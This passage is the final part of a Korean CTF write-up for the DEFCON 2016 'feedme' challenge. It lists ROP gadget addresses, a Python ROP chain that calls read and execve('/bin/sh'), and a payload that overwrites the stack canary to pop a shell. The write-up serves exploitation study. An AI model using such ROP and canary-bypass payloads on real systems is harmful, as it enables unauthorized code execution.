+<h2 id="rop-code-gadget" style="position:relative;"><a href="#rop-code-gadget" aria-label="rop code gadget permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP Code Gadget</h2>
+<ul>
+<li>ROPgadget 도구를 사용하여 필요한 Gadget을 찾아 보겠다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 55.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADH0lEQVQozzWOzWsjdRiAX9NdKqioXXF3W5Kmk8lMMjOZ+U0yme/MdzqZfKdtbENil5ZuWUVEPeh60IOKFz0p6P/gbaUnsSgomoNnr3sIIj1KtWDdnVcs+MDDc33ADuynAeD6dHT0/u5ohn2v+0fX2rzYCQcXPad9MbDji0Ej+TNyk9RrDrFuNlEgJvLERE7UUSAWlkX9SoavIyAivPn6W/DG5LU70+Hsl37N+2ZPi063at7p0IhP+1br244W/1QRnE8Zwdymy/rLOUqeZiky/b9ZikyyFNlbL1QnoDkGA889eePV6StfHu4eYLfu4kgPsWWE6NZd9Csa+pKJIm+9XauFIGox8EoIHHFBlhyQRQfWNgisrXOQpUQAzTWfAQDoD44Pt3aOvu92Zg+iaHwSx3sn0ebuSbM1edAdHJy2+3ffdcOpYkVTzxscO2683+g2Z04v3ncorr1ycxmALpnX4Ouv3oPRSwnsTI7faQ+2/9Gd6Lcg7p1Z3uaZ7oRngROe2Zb3e930zlXLR0OzHzuK8ViQ6o9EjjwSyyTNsbafZUygS1YGZneSpe3dFownR58kvQFWdRvdqIW230TP8bGpmSgrOhLVQKmmYlWQUKZZ5AsMrlE0Zgss0qzVLLA6UIyWgUbUWEb8C0bje/e6w+mvphr86OvRXG0kc0ML55Zsz8sVY84Tey5WnXmZ2HOBV3+WeXVOsfIPG0X5O7ocyHTJA7rkZkBzjZXbdO7F3tbR/SjZOlc0/6HjJguemIsyMReK6i2CeLSwvPaC4esLTjIWZVF/yAjqOSf6H+SZ61DV/Mzt9WcBlgHg8KDzRNwLIe5MPtYtF4tlCS03QkW3UZAU5CtVNBsBelGCPFEwS7GYK/wng3mafHErdwNeWIUlUrsPVwxd+9peEEDfHX/YsRPUOe3vQPFTW7RSg9dTRzDSZtVNdbmRbpRIulEU03yxcpkvVpBitc9W88/Dan5lSZDuAst1AeKOvdQeBBC1xh+FcYIFlr+0vQhV00GiaCiIVVSNBjbbfazpFrKChOs0e3l1WCSf38o9BTezyxlO3L86/BeJ7xtkOWSA0QAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./17.png"
+        title="./17.png"
+        src="/static/4edd80109d311430c02adc4c701b327d/37523/17.png"
+        srcset="/static/4edd80109d311430c02adc4c701b327d/e9ff0/17.png 180w,
+/static/4edd80109d311430c02adc4c701b327d/f21e7/17.png 360w,
+/static/4edd80109d311430c02adc4c701b327d/37523/17.png 720w,
+/static/4edd80109d311430c02adc4c701b327d/302a4/17.png 1080w,
+/static/4edd80109d311430c02adc4c701b327d/48ca3/17.png 1084w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>ROP Gadget</p>
+<h2 id="rop" style="position:relative;"><a href="#rop" aria-label="rop permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROP</h2>
+<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">.</span>bss<span class="token punctuation">,</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh\x00<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+
+<span class="token function">execve</span><span class="token punctuation">(</span><span class="token punctuation">.</span>bss<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></code></pre></div>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment">#ROP</span>
+pppr <span class="token operator">=</span> <span class="token number">0x806f370</span>
+peax <span class="token operator">=</span> <span class="token number">0x80bb496</span>
+syscall <span class="token operator">=</span> <span class="token number">0x806fa20</span>
+    
+<span class="token comment"># read</span>
+rop <span class="token operator">=</span> p32<span class="token punctuation">(</span>peax<span class="token punctuation">)</span>
+rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span>
+rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pppr<span class="token punctuation">)</span>
+rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> 
+rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
+
+<span class="token comment"># execve    </span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span>peax<span class="token punctuation">)</span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span>pppr<span class="token punctuation">)</span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span>e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+rop<span class="token operator">+=</span> p32<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span></code></pre></div>
+<h2 id="exploit" style="position:relative;"><a href="#exploit" aria-label="exploit permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Exploit</h2>
+<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">payload <span class="token operator">=</span> <span class="token function">p8</span><span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token function">p8</span><span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0xC</span> <span class="token operator">+</span> rop
+    
+p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXUlEQVQoz23QX0hTcRQH8F/P9aDQm7i7+//eebc53dT9cas1lxuWD2blNG9IReCDRdFTEWUZrS3J6CUI9CHywaYJ9eBk6kwTWxrZMjYNYzfUoCRhWbu5E5spGT18OIfz8OWcg3YfcWuah57Oe8MhaB0JQl3wyd0Lg10oBN/Q/gMNnsrq+uP2Kk9jRVWd6HQfFh2uWlFnsIvFZQ6RE4yiktKJOFMk4vQGhIZu7Jp4E/0EsxJAfBHaJ0MDNaO+5sYHV72lVidYzDawW/aC3mACTXEZcOoiwJkCIFgBlLQKMIrfBqGWQ7md8bfSwuISvF/+DC3jvbETI3eiTT3eWLHZvipoCtd5lpUZgpbzcErOJ2hZQbJyPsFk678QOleb0xWbkaSFBMQ+SnD2Rf90Q+hWoOmxf9DqPPjdYLKCkhXSeQSTxiguS0FyaSXF/+nZrXkGQn2tOcMTEQnGovDrZQxujj177Rn2B0/3tY87XNVJQasHXqtPMwUawCgOFCSbRTAqUNJ8ts/MNyF070zOw1eTUuLdHMzNzsP5cO/UsXB7Z9OjtoDZVpE0Wu1gsu1Ll5ptQHEC5BPMVuhm2N+hCJ2qyu2X5qVkKgVffv6Ai5GB0Zrg9fv13dd6LPbKVbXOsC7oSlIUr5ZJVpBxRiWT3EbN/AyjuG0Quly3M/J1WYKVJMDaOvhnhqePDnpDJwO+SLnDBQXaItDqy4Dm1UCr1EByQhbOZM7dvm0G2uEuL+n+MJtYWktCfHUFrkw97wIAdKmjA7PuqW7j1MbbQqHFh5Fan4LU+jCqMEtJ63z4f/wGct1LIw4Q6ToAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./18.png"
+        title="./18.png"
+        src="/static/44e151bc7a69f5e6afa00e029e6e3a0f/37523/18.png"
+        srcset="/static/44e151bc7a69f5e6afa00e029e6e3a0f/e9ff0/18.png 180w,
+/static/44e151bc7a69f5e6afa00e029e6e3a0f/f21e7/18.png 360w,
+/static/44e151bc7a69f5e6afa00e029e6e3a0f/37523/18.png 720w,
+/static/44e151bc7a69f5e6afa00e029e6e3a0f/302a4/18.png 1080w,
+/static/44e151bc7a69f5e6afa00e029e6e3a0f/07a9c/18.png 1440w,
+/static/44e151bc7a69f5e6afa00e029e6e3a0f/c4451/18.png 1450w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>Exploit memory</p>
+<ul>
+<li>ROP 를 바탕으로 쉘 권한을 획득할 수 있는 것을 확인할 수 있다.</li>
+</ul>
+<div class="table-of-contents">
+<ul>
+<li><a href="#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94">바이너리 개요</a></li>
+<li><a href="#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95">보호기법</a></li>
+<li><a href="#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D">바이너리 분석</a></li>
+<li><a href="#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D">main 함수 분석</a></li>
+<li><a href="#sub_80490b0-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D">sub_80490B0 함수 분석</a></li>
+<li><a href="#sub_804f700-feedme-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D">sub_804F700 [feedme] 함수 분석</a></li>
+<li><a href="#sub_8048e42-read_byte-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D">sub_8048E42 [read_byte] 함수 분석</a></li>
+<li><a href="#sub_8048e7e-next_read-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D">sub_8048E7E [next_read] 함수 분석</a></li>
+<li><a href="#canary-%EB%B6%84%EC%84%9D">canary 분석</a></li>
+<li><a href="#fork-%EB%B6%84%EC%84%9D">fork 분석</a></li>
+<li><a href="#%EA%B3%B5%EA%B2%A9">공격</a></li>
+<li><a href="#canary-brute-force">canary brute-force</a></li>
+<li><a href="#rop-sceanario">ROP sceanario</a></li>
+<li><a href="#rop%EC%8B%9C-%ED%95%84%EC%9A%94%ED%95%9C-sys_call">ROP시 필요한 SYS_CALL</a></li>
+<li><a href="#rop-code-gadget">ROP Code Gadget</a></li>
+<li><a href="#rop">ROP</a></li>
+<li><a href="#exploit">Exploit</a></li>
+</ul>
+</div></div></div><div class="post-navigator"><div class="post-navigator-card-wrapper"><a class="post-card prev" href="/csaw_popping_ctf_writeup/"><div class="direction">이전 글</div><div class="title">CSAW 2019 popping_caps 취약점 분석</div></a></div><div class="post-navigator-card-wrapper"><a class="post-card next" href="/csaw_small_boi_ctf_writeup/"><div class="direction">다음 글</div><div class="title">CSAW 2019 small_boi 취약점 분석</div></a></div></div><div class="utterances"></div></main><footer class="page-footer-wrapper"><p class="page-footer">© <!-- -->2021<!-- --> <a href="https://github.com/dnsdudrla97">Zer0Luck</a> powered by<a href="https://github.com/zoomKoding/"> zoomkoding</a></p></footer><div class="dark-mode-button-wrapper"><button class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium dark-mode-button css-1yxmbwk" tabindex="0" type="button"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge dark-mode-icon css-6flbmm" focusable="false" viewBox="0 0 24 24" aria-hidden="true" data-testid="DarkModeIcon"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"></path></svg></button></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/defcon2016_feedme_ctf_writeup/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-1c8b3614439a319fec88.js"],"app":["/app-7556968f1157cba98cd0.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-300892b2f0d9ef861b4f.js"],"component---src-pages-404-js":["/component---src-pages-404-js-214712bad1e95d0a00fb.js"],"component---src-pages-about-js":["/component---src-pages-about-js-b6c2fb7635bce234c24f.js"],"component---src-pages-index-js":["/component---src-pages-index-js-ca3dc2d79b71372fdfbb.js"],"component---src-templates-blog-template-js":["/component---src-templates-blog-template-js-c8576cef7b6a608fcd4a.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-779d460b2a3b98273321.js"]};/*]]>*/</script><script src="/polyfill-1c8b3614439a319fec88.js" nomodule=""></script><script src="/component---src-templates-blog-template-js-c8576cef7b6a608fcd4a.js" async=""></script><script src="/f9d3028dbef90a6e9b8db85387d63dd9f4edf538-f8cf487d5388e1dc0b4b.js" async=""></script><script src="/app-7556968f1157cba98cd0.js" async=""></script><script src="/framework-373e01a4682a5f0c98a3.js" async=""></script><script src="/webpack-runtime-7540f1a080c56993ae69.js" async=""></script></body></html>
